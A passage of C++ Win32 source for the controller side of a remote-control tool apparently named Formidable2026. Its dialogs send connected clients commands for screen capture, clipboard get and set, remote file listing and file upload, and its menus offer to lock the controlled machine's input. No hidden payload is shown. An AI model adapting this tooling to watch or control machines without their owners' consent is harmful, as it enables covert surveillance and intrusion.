        }
    }
    return DefSubclassProc(hWnd, message, wParam, lParam);
}

INT_PTR CALLBACK DesktopDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    
    auto SendRemoteControl = [&](uint32_t clientId, uint32_t cmd, void* data, size_t size) {
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) return;

        size_t bodySize = sizeof(CommandPkg) - 1 + size;
        std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
        PkgHeader* header = (PkgHeader*)buffer.data();
        memcpy(header->flag, "FRMD26?", 7);
        header->originLen = (int)bodySize;
        header->totalLen = (int)buffer.size();
        
        CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
        pkg->cmd = cmd;
        pkg->arg1 = (uint32_t)size;
        memcpy(pkg->data, data, size);
        
        std::lock_guard<std::mutex> lockSend(client->sendMutex);
        send(client->socket, buffer.data(), (int)buffer.size(), 0);
    };

    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        
        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
        if (hStatic) {
            SetWindowSubclass(hStatic, DesktopScreenProc, clientId, (DWORD_PTR)hDlg);
        }

        // 默认启动监控
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (client) {
            client->isMonitoring = true;
            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_SCREEN_CAPTURE;
            pkg.arg1 = 1; // Start
            
            size_t bodySize = sizeof(CommandPkg);
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(PkgHeader), &pkg, bodySize);
            
            std::lock_guard<std::mutex> lockSend(client->sendMutex);
            send(client->socket, buffer.data(), (int)buffer.size(), 0);
        }

        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        HWND hStatic = GetDlgItem(hDlg, IDC_STATIC_SCREEN);
        if (hStatic) {
            RECT rc;
            GetClientRect(hDlg, &rc);
            MoveWindow(hStatic, 0, 0, rc.right, rc.bottom, TRUE);
        }
        return (INT_PTR)TRUE;
    }
    case WM_CONTEXTMENU: {
        HMENU hMenu = CreatePopupMenu();
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_MOVE, L"移动[M]");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SIZE, L"大小[S]");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_MINIMIZE, L"最小化[N]");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_MAXIMIZE, L"最大化[X]");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_CLOSE, L"关闭[C]");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_CONTROL, L"控制屏幕(Y)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_FULLSCREEN, L"全屏");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_REMOTE_CURSOR, L"使用远程光标(C)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_STRETCH, L"自适应窗口大小(A)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_TRACK_CURSOR, L"跟踪被控光标(T)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_LOCK_INPUT, L"锁定被控鼠标和键盘(L)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SNAPSHOT, L"保存快照(S)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_REC_MJPEG, L"录像(MJPEG)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_REC_H264, L"录像(H264)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_GET_CLIPBOARD, L"获取剪贴板(R)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SET_CLIPBOARD, L"设置剪贴板(S)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_SWITCH_MONITOR, L"切换显示器(1)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_MULTI_THREAD_COMPRESS, L"多线程压缩(2)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_RES_ORIGINAL, L"原始分辨率(3)");
        AppendMenuW(hMenu, MF_STRING, IDM_DESKTOP_RES_1080P, L"限制为1080P(4)");
        
        HMENU hFpsMenu = CreatePopupMenu();
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_5, L"5 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_10, L"10 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_15, L"15 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_20, L"20 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_25, L"25 FPS");
        AppendMenuW(hFpsMenu, MF_STRING, IDM_DESKTOP_FPS_30, L"30 FPS");
        AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hFpsMenu, L"帧率设置");

        TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON, LOWORD(lParam), HIWORD(lParam), 0, hDlg, NULL);
        DestroyMenu(hMenu);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        switch (LOWORD(wParam)) {
        case IDM_DESKTOP_MOVE:
            SendMessage(hDlg, WM_SYSCOMMAND, SC_MOVE, 0);
            break;
        case IDM_DESKTOP_SIZE:
            SendMessage(hDlg, WM_SYSCOMMAND, SC_SIZE, 0);
            break;
        case IDM_DESKTOP_MINIMIZE:
            ShowWindow(hDlg, SW_MINIMIZE);
            break;
        case IDM_DESKTOP_MAXIMIZE:
            ShowWindow(hDlg, SW_MAXIMIZE);
            break;
        case IDM_DESKTOP_CLOSE:
            SendMessage(hDlg, WM_CLOSE, 0, 0);
            break;
        case IDM_DESKTOP_CONTROL: {
            static bool bControl = true;
            bControl = !bControl;
            // TODO: Implement toggle control logic if needed on client side
            break;
        }
        case IDM_DESKTOP_FULLSCREEN: {
            static bool bFull = false;
            bFull = !bFull;
            if (bFull) ShowWindow(hDlg, SW_MAXIMIZE);
            else ShowWindow(hDlg, SW_RESTORE);
            break;
        }
        case IDM_DESKTOP_SNAPSHOT: {
            HBITMAP hBmp = (HBITMAP)SendMessage(GetDlgItem(hDlg, IDC_STATIC_SCREEN), STM_GETIMAGE, IMAGE_BITMAP, 0);
            if (hBmp) {
                // TODO: Save snapshot to file
                MessageBoxW(hDlg, L"快照已保存 (功能开发中)", L"提示", MB_OK);
            }
            break;
        }
        case IDM_DESKTOP_GET_CLIPBOARD: {
            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_CLIPBOARD_GET;
            SendRemoteControl(clientId, CMD_CLIPBOARD_GET, NULL, 0);
            break;
        }
        case IDM_DESKTOP_SET_CLIPBOARD: {
            if (OpenClipboard(hDlg)) {
                HANDLE hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t* pText = (wchar_t*)GlobalLock(hData);
                    if (pText) {
                        std::string text = WideToUTF8(pText);
                        CommandPkg pkg = { 0 };
                        pkg.cmd = CMD_CLIPBOARD_SET;
                        
                        size_t bodySize = sizeof(CommandPkg) - 1 + text.size() + 1;
                        std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                        PkgHeader* header = (PkgHeader*)buffer.data();
                        memcpy(header->flag, "FRMD26?", 7);
                        header->originLen = (int)bodySize;
                        header->totalLen = (int)buffer.size();
                        
                        CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                        pPkg->cmd = CMD_CLIPBOARD_SET;
                        memcpy(pPkg->data, text.c_str(), text.size() + 1);
                        
                        std::lock_guard<std::mutex> lock(client->sendMutex);
                        send(client->socket, buffer.data(), (int)buffer.size(), 0);
                        
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
            break;
        }
        case IDM_DESKTOP_FPS_5:
        case IDM_DESKTOP_FPS_10:
        case IDM_DESKTOP_FPS_15:
        case IDM_DESKTOP_FPS_20:
        case IDM_DESKTOP_FPS_25:
        case IDM_DESKTOP_FPS_30: {
            uint32_t fps = 10;
            if (LOWORD(wParam) == IDM_DESKTOP_FPS_5) fps = 5;
            else if (LOWORD(wParam) == IDM_DESKTOP_FPS_10) fps = 10;
            else if (LOWORD(wParam) == IDM_DESKTOP_FPS_15) fps = 15;
            else if (LOWORD(wParam) == IDM_DESKTOP_FPS_20) fps = 20;
            else if (LOWORD(wParam) == IDM_DESKTOP_FPS_25) fps = 25;
            else if (LOWORD(wParam) == IDM_DESKTOP_FPS_30) fps = 30;
            
            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_SCREEN_CAPTURE;
            pkg.arg1 = 2; // Change FPS
            pkg.arg2 = fps;
            SendRemoteControl(clientId, CMD_SCREEN_CAPTURE, &pkg, sizeof(CommandPkg));
            break;
        }
        case IDCANCEL: {
            // Stop first
            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_SCREEN_CAPTURE;
            pkg.arg1 = 0; // Stop
            size_t bodySize = sizeof(CommandPkg);
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(PkgHeader), &pkg, bodySize);
            {
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
            }

            EndDialog(hDlg, LOWORD(wParam));
            dlgToClientId.erase(hDlg);
            return (INT_PTR)TRUE;
        }
        }
        break;
    }
    case WM_CLOSE: {
        uint32_t clientId = dlgToClientId[hDlg];
        std::shared_ptr<ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (client) {
             CommandPkg pkg = { 0 };
            pkg.cmd = CMD_SCREEN_CAPTURE;
            pkg.arg1 = 0; // Stop
            size_t bodySize = sizeof(CommandPkg);
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            memcpy(buffer.data() + sizeof(PkgHeader), &pkg, bodySize);
            {
                std::lock_guard<std::mutex> lock(client->sendMutex);
                send(client->socket, buffer.data(), (int)buffer.size(), 0);
            }
        }
        EndDialog(hDlg, 0);
        dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    }
    return (INT_PTR)FALSE;
 }

 void RefreshLocalFileList(HWND hDlg, HWND hList, const std::wstring& path) {
    ListView_DeleteAllItems(hList);
    int i = 0;
    
    // Add ".." if not root
    if (path.length() > 3) {
        LVITEMW lvi = { 0 };
        lvi.mask = LVIF_TEXT | LVIF_PARAM | LVIF_IMAGE;
        lvi.iItem = i++;
        lvi.pszText = (LPWSTR)L"..";
        lvi.lParam = 1; // Dir
        lvi.iImage = 1; // Folder icon
        ListView_InsertItem(hList, &lvi);
    }

    std::wstring searchPath = path;
    if (searchPath.back() != L'\\') searchPath += L"\\";
    searchPath += L"*";

    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);
        do {
            if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

            bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
            
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_PARAM | LVIF_IMAGE;
            lvi.iItem = i++;
            lvi.pszText = ffd.cFileName;
            lvi.lParam = isDir ? 1 : 0;
            lvi.iImage = isDir ? 1 : 2; // Folder or File icon
            int idx = ListView_InsertItem(hList, &lvi);


            if (!isDir) {
                ULARGE_INTEGER fileSize;
                fileSize.LowPart = ffd.nFileSizeLow;
                fileSize.HighPart = ffd.nFileSizeHigh;
                wchar_t szSize[64];
                if (fileSize.QuadPart < 1024) swprintf_s(szSize, L"%llu B", fileSize.QuadPart);
                else if (fileSize.QuadPart < 1024 * 1024) swprintf_s(szSize, L"%.2f KB", fileSize.QuadPart / 1024.0);
                else if (fileSize.QuadPart < 1024 * 1024 * 1024) swprintf_s(szSize, L"%.2f MB", fileSize.QuadPart / (1024.0 * 1024.0));
                else swprintf_s(szSize, L"%.2f GB", fileSize.QuadPart / (1024.0 * 1024.0 * 1024.0));
                ListView_SetItemText(hList, idx, 1, szSize);
            } else {
                ListView_SetItemText(hList, idx, 1, (LPWSTR)L"<DIR>");
            }

            SYSTEMTIME st;
            FileTimeToSystemTime(&ffd.ftLastWriteTime, &st);
            wchar_t szTime[64];
            swprintf_s(szTime, L"%04d-%02d-%02d %02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
            ListView_SetItemText(hList, idx, 2, szTime);

        } while (FindNextFileW(hFind, &ffd) != 0);
        FindClose(hFind);
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

INT_PTR CALLBACK FileDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    static std::map<HWND, uint32_t> dlgToClientId;
    static std::map<HWND, HIMAGELIST> dlgToImageList;
    static std::map<HWND, std::wstring> remotePath;
    static std::map<HWND, std::wstring> localPath;
    
    switch (message) {
    case WM_MOUSEMOVE: {
        if (GetCapture() == hDlg) {
            SetCursor(LoadCursor(NULL, IDC_SIZEALL));
        }
        break;
    }
    case WM_LBUTTONUP: {
        if (GetCapture() == hDlg) {
            ReleaseCapture();
            SetCursor(LoadCursor(NULL, IDC_ARROW));
            
            HWND hSrcList = (HWND)GetPropW(hDlg, L"DragSource");
            int itemIndex = (int)(DWORD_PTR)GetPropW(hDlg, L"DragItem");
            RemovePropW(hDlg, L"DragSource");
            RemovePropW(hDlg, L"DragItem");
            
            POINT pt;
            GetCursorPos(&pt);
            HWND hTarget = WindowFromPoint(pt);
            
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            
            if (hSrcList == hLocalList && (hTarget == hRemoteList || IsChild(hRemoteList, hTarget))) {
                // Drag from Local to Remote -> Send
                SendMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_SEND, 0);
            } else if (hSrcList == hRemoteList && (hTarget == hLocalList || IsChild(hLocalList, hTarget))) {
                // Drag from Remote to Local -> Copy (Download)
                SendMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_COPY, 0);
            }
        }
        break;
    }
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        dlgToClientId[hDlg] = clientId;
        remotePath[hDlg] = L"C:\\";
        localPath[hDlg] = L"C:\\";
        
        SetDlgItemTextW(hDlg, IDC_EDIT_FILE_PATH_REMOTE, L"C:\\");
        SetDlgItemTextW(hDlg, IDC_EDIT_FILE_PATH_LOCAL, L"C:\\");

        HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
        HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
        
        // Hide buttons as functions are now in right-click menu
        const int buttons[] = { IDC_BTN_FILE_SEND, IDC_BTN_FILE_COPY, IDC_BTN_FILE_DELETE, IDC_BTN_FILE_MKDIR, IDC_BTN_FILE_LAYOUT };
        for (int btn : buttons) ShowWindow(GetDlgItem(hDlg, btn), SW_HIDE);

        ListView_SetExtendedListViewStyle(hRemoteList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        ListView_SetExtendedListViewStyle(hLocalList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"名称"; lvc.cx = 250; 
        ListView_InsertColumn(hRemoteList, 0, &lvc);
        ListView_InsertColumn(hLocalList, 0, &lvc);
        
        lvc.pszText = (LPWSTR)L"大小"; lvc.cx = 80;  
        ListView_InsertColumn(hRemoteList, 1, &lvc);
        ListView_InsertColumn(hLocalList, 1, &lvc);
        
        lvc.pszText = (LPWSTR)L"修改时间"; lvc.cx = 120; 
        ListView_InsertColumn(hRemoteList, 2, &lvc);
        ListView_InsertColumn(hLocalList, 2, &lvc);
        
        // --- Icon Setup ---
        HIMAGELIST hImageList = ImageList_Create(16, 16, ILC_COLOR32 | ILC_MASK, 3, 0);
        HICON hIconComputer = (HICON)LoadImageW(NULL, L"e:\\github\\Formidable2026\\我的电脑图标.ico", IMAGE_ICON, 16, 16, LR_LOADFROMFILE);
        HICON hIconFolder = (HICON)LoadImageW(NULL, L"e:\\github\\Formidable2026\\文件夹图标.ico", IMAGE_ICON, 16, 16, LR_LOADFROMFILE);
        
        HICON hIconFile = NULL;
        ExtractIconExW(L"shell32.dll", 0, NULL, &hIconFile, 1);

        if (hIconComputer) ImageList_AddIcon(hImageList, hIconComputer); // 0
        else ImageList_AddIcon(hImageList, LoadIcon(NULL, IDI_APPLICATION));

        if (hIconFolder) ImageList_AddIcon(hImageList, hIconFolder);     // 1
        else {
            SHSTOCKICONINFO sii = { 0 };
            sii.cbSize = sizeof(sii);
            if (SUCCEEDED(SHGetStockIconInfo(SIID_FOLDER, SHGSI_ICON | SHGSI_SMALLICON, &sii)) && sii.hIcon) {
                ImageList_AddIcon(hImageList, sii.hIcon);
                DestroyIcon(sii.hIcon);
            } else {
                ImageList_AddIcon(hImageList, LoadIcon(NULL, IDI_APPLICATION));
            }
        }

        if (hIconFile) ImageList_AddIcon(hImageList, hIconFile);         // 2
        else ImageList_AddIcon(hImageList, LoadIcon(NULL, IDI_WINLOGO));

        if (hIconFile) DestroyIcon(hIconFile);
        
        ListView_SetImageList(hRemoteList, hImageList, LVSIL_SMALL);
        ListView_SetImageList(hLocalList, hImageList, LVSIL_SMALL);

        dlgToImageList[hDlg] = hImageList;

        // Initial refresh
        PostMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_GO_REMOTE, 0);
        RefreshLocalFileList(hDlg, hLocalList, localPath[hDlg]);
        
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        int mid = rc.bottom / 2;
        
        // Remote section
        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_FILE_PATH_REMOTE), 45, 5, rc.right - 100, 20, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_BTN_FILE_GO_REMOTE), rc.right - 50, 4, 45, 22, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE), 0, 30, rc.right, mid - 35, TRUE);
        
        // Local section
        int localTop = mid + 5;
        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_FILE_PATH_LOCAL), 45, localTop, rc.right - 100, 20, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_BTN_FILE_GO_LOCAL), rc.right - 50, localTop - 1, 45, 22, TRUE);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL), 0, localTop + 25, rc.right, rc.bottom - (localTop + 25), TRUE);
        
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->code == NM_RCLICK) {
            POINT pt;
            GetCursorPos(&pt);
            HMENU hMenu = CreatePopupMenu();
            if (nm->idFrom == IDC_LIST_FILE_REMOTE) {
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_SEND, L"发送到本地[S]");
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_DELETE, L"删除[D]");
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_MKDIR, L"新建文件夹[N]");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_LAYOUT, L"切换布局[L]");
            } else if (nm->idFrom == IDC_LIST_FILE_LOCAL) {
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_SEND, L"发送到远程[S]");
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_DELETE, L"删除[D]");
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_MKDIR, L"新建文件夹[N]");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDC_BTN_FILE_LAYOUT, L"切换布局[L]");
            }
            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
            DestroyMenu(hMenu);
        } else if (nm->code == NM_DBLCLK) {
            if (nm->idFrom == IDC_LIST_FILE_REMOTE) {
                int index = ((LPNMITEMACTIVATE)lParam)->iItem;
                if (index != -1) {
                    wchar_t name[MAX_PATH];
                    ListView_GetItemText(nm->hwndFrom, index, 0, name, MAX_PATH);
                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_PARAM;
                    lvi.iItem = index;
                    ListView_GetItem(nm->hwndFrom, &lvi);
                    if (lvi.lParam == 1) { // Is Directory
                        std::wstring newPath = remotePath[hDlg];
                        if (newPath.back() != L'\\') newPath += L"\\";
                        if (wcscmp(name, L"..") == 0) {
                            size_t pos = newPath.find_last_of(L'\\', newPath.length() - 2);
                            if (pos != std::wstring::npos) newPath = newPath.substr(0, pos + 1);
                        } else {
                            newPath += name;
                        }
                        SetDlgItemTextW(hDlg, IDC_EDIT_FILE_PATH_REMOTE, newPath.c_str());
                        SendMessage(hDlg, WM_COMMAND, IDC_BTN_FILE_GO_REMOTE, 0);
                    }
                }
            } else if (nm->idFrom == IDC_LIST_FILE_LOCAL) {
                int index = ((LPNMITEMACTIVATE)lParam)->iItem;
                if (index != -1) {
                    wchar_t name[MAX_PATH];
                    ListView_GetItemText(nm->hwndFrom, index, 0, name, MAX_PATH);
                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_PARAM;
                    lvi.iItem = index;
                    ListView_GetItem(nm->hwndFrom, &lvi);
                    if (lvi.lParam == 1) { // Is Directory
                        std::wstring newPath = localPath[hDlg];
                        if (newPath.back() != L'\\') newPath += L"\\";
                        if (wcscmp(name, L"..") == 0) {
                            size_t pos = newPath.find_last_of(L'\\', newPath.length() - 2);
                            if (pos != std::wstring::npos) newPath = newPath.substr(0, pos + 1);
                        } else {
                            newPath += name;
                        }
                        localPath[hDlg] = newPath;
                        SetDlgItemTextW(hDlg, IDC_EDIT_FILE_PATH_LOCAL, newPath.c_str());
                        RefreshLocalFileList(hDlg, nm->hwndFrom, newPath);
                    }
                }
            }
        } else if (nm->code == LVN_BEGINDRAG) {
            LPNMLISTVIEW pnmv = (LPNMLISTVIEW)lParam;
            HWND hSrcList = nm->hwndFrom;
            int itemIndex = pnmv->iItem;
            
            // Set capture and change cursor
            SetCapture(hDlg);
            SetCursor(LoadCursor(NULL, IDC_SIZEALL));
            
            // Store drag info in properties
            SetPropW(hDlg, L"DragSource", (HANDLE)hSrcList);
            SetPropW(hDlg, L"DragItem", (HANDLE)(DWORD_PTR)itemIndex);
        }
        break;
    }
     case WM_COMMAND: {
         uint32_t clientId = dlgToClientId[hDlg];
         std::shared_ptr<ConnectedClient> client;
         {
             std::lock_guard<std::mutex> lock(g_ClientsMutex);
             if (g_Clients.count(clientId)) client = g_Clients[clientId];
         }
         if (!client) break;

        if (LOWORD(wParam) == IDC_BTN_FILE_GO_REMOTE) {
            wchar_t wPath[MAX_PATH];
            GetDlgItemTextW(hDlg, IDC_EDIT_FILE_PATH_REMOTE, wPath, MAX_PATH);
            std::string path = WideToUTF8(wPath);
            remotePath[hDlg] = wPath;

            CommandPkg pkg = { 0 };
            pkg.cmd = CMD_FILE_LIST;
            
            size_t bodySize = sizeof(CommandPkg) - 1 + path.size() + 1;
            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
            PkgHeader* header = (PkgHeader*)buffer.data();
            memcpy(header->flag, "FRMD26?", 7);
            header->originLen = (int)bodySize;
            header->totalLen = (int)buffer.size();
            
            CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
            pPkg->cmd = pkg.cmd;
            pPkg->arg1 = pkg.arg1;
            memcpy(pPkg->data, path.c_str(), path.size() + 1);
            
            std::lock_guard<std::mutex> lock(client->sendMutex);
            send(client->socket, buffer.data(), (int)buffer.size(), 0);
        } else if (LOWORD(wParam) == IDC_BTN_FILE_GO_LOCAL) {
            wchar_t wPath[MAX_PATH];
            GetDlgItemTextW(hDlg, IDC_EDIT_FILE_PATH_LOCAL, wPath, MAX_PATH);
            localPath[hDlg] = wPath;
            RefreshLocalFileList(hDlg, GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL), localPath[hDlg]);
        } else if (LOWORD(wParam) == IDC_BTN_FILE_SEND) {
            HWND hRemoteList = GetDlgItem(hDlg, IDC_LIST_FILE_REMOTE);
            HWND hLocalList = GetDlgItem(hDlg, IDC_LIST_FILE_LOCAL);
            HWND hFocus = GetFocus();
            
            if (hFocus == hLocalList) {
                // Local -> Remote (Upload)
                std::vector<std::wstring> selectedItems;
                int index = -1;
                while ((index = ListView_GetNextItem(hLocalList, index, LVNI_SELECTED)) != -1) {
                    wchar_t name[MAX_PATH];
                    ListView_GetItemText(hLocalList, index, 0, name, MAX_PATH);
                    selectedItems.push_back(name);
                }

                if (!selectedItems.empty()) {
                    std::wstring localBase = localPath[hDlg];
                    std::wstring remoteBase = remotePath[hDlg];
                    
                    std::thread([client, localBase, remoteBase, selectedItems, hDlg]() {
                        // Helper lambda for recursive upload
                        std::function<void(const std::wstring&, const std::wstring&)> uploadDir;
                        
                        auto uploadFile = [&](const std::wstring& localFile, const std::wstring& remoteFile) {
                            std::ifstream file(localFile, std::ios::binary);
                            if (!file.is_open()) return;

                            std::string rPath = WideToUTF8(remoteFile);
                            CommandPkg pkg = { 0 };
                            pkg.cmd = CMD_FILE_UPLOAD;
                            pkg.arg2 = 0; // START
                            size_t bodySize = sizeof(CommandPkg) - 1 + rPath.size() + 1;
                            std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                            PkgHeader* header = (PkgHeader*)buffer.data();
                            memcpy(header->flag, "FRMD26?", 7);
                            header->originLen = (int)bodySize;
                            header->totalLen = (int)buffer.size();
                            CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                            pPkg->cmd = pkg.cmd;
                            pPkg->arg2 = 0;
                            memcpy(pPkg->data, rPath.c_str(), rPath.size() + 1);
                            {
                                std::lock_guard<std::mutex> lock(client->sendMutex);
                                send(client->socket, buffer.data(), (int)buffer.size(), 0);
                            }

                            char fileBuf[8192];
                            while (file.read(fileBuf, sizeof(fileBuf)) || file.gcount() > 0) {
                                size_t dataLen = (size_t)file.gcount();
                                if (dataLen == 0) break;
                                size_t blockBodySize = sizeof(CommandPkg) - 1 + dataLen;
                                std::vector<char> blockBuffer(sizeof(PkgHeader) + blockBodySize);
                                PkgHeader* bHeader = (PkgHeader*)blockBuffer.data();
                                memcpy(bHeader->flag, "FRMD26?", 7);
                                bHeader->originLen = (int)blockBodySize;
                                bHeader->totalLen = (int)blockBuffer.size();
                                CommandPkg* bpPkg = (CommandPkg*)(blockBuffer.data() + sizeof(PkgHeader));
                                bpPkg->cmd = CMD_FILE_DATA;
                                bpPkg->arg1 = (uint32_t)dataLen;
                                memcpy(bpPkg->data, fileBuf, dataLen);
                                std::lock_guard<std::mutex> lock(client->sendMutex);
                                send(client->socket, blockBuffer.data(), (int)blockBuffer.size(), 0);
                            }
                            file.close();

                            pkg.arg2 = 1; // FINISH
                            {
                                std::lock_guard<std::mutex> lock(client->sendMutex);
                                send(client->socket, buffer.data(), (int)buffer.size(), 0);
                            }
                        };

                        uploadDir = [&](const std::wstring& lPath, const std::wstring& rPath) {
                            // Create remote directory
                            {
                                std::string sRemotePath = WideToUTF8(rPath);
                                CommandPkg pkg = { 0 };
                                pkg.cmd = CMD_FILE_MKDIR;
                                size_t bodySize = sizeof(CommandPkg) - 1 + sRemotePath.size() + 1;
                                std::vector<char> buffer(sizeof(PkgHeader) + bodySize);
                                PkgHeader* header = (PkgHeader*)buffer.data();
                                memcpy(header->flag, "FRMD26?", 7);
                                header->originLen = (int)bodySize;
                                header->totalLen = (int)buffer.size();
                                CommandPkg* pPkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
                                pPkg->cmd = pkg.cmd;
                                memcpy(pPkg->data, sRemotePath.c_str(), sRemotePath.size() + 1);
